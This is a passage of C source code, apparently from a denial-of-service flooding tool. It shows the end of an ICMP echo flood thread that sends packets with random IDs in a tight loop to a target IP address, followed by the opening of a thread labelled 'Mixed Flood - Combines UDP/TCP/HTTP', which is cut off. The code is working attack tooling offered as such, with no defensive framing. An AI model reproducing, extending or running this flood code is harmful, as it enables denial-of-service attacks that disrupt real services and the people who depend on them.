    struct sockaddr_in dest = {.sin_family = AF_INET};
    dest.sin_addr.s_addr = inet_addr(ip);
    char packet[64];
    struct icmphdr *icmp = (struct icmphdr*)packet;
    memset(packet, 0, 64);
    icmp->type = ICMP_ECHO;
    unsigned long long local_sent = 0;
    
    while (running) {
        icmp->un.echo.id = rand();
        icmp->un.echo.sequence = rand();
        icmp->checksum = 0;
        icmp->checksum = checksum(packet, sizeof(struct icmphdr));
        sendto(sock, packet, sizeof(struct icmphdr), 0, (struct sockaddr*)&dest, sizeof(dest));
        local_sent++;
        if ((local_sent & 0xFFF) == 0) sched_yield();
    }
    __sync_fetch_and_add(&total_sent, local_sent);
    close(sock);
    return NULL;
}

// Mixed Flood - Combines UDP/TCP/HTTP
void *mixed_thread(void *arg) {
    char *ip = (char*)arg;
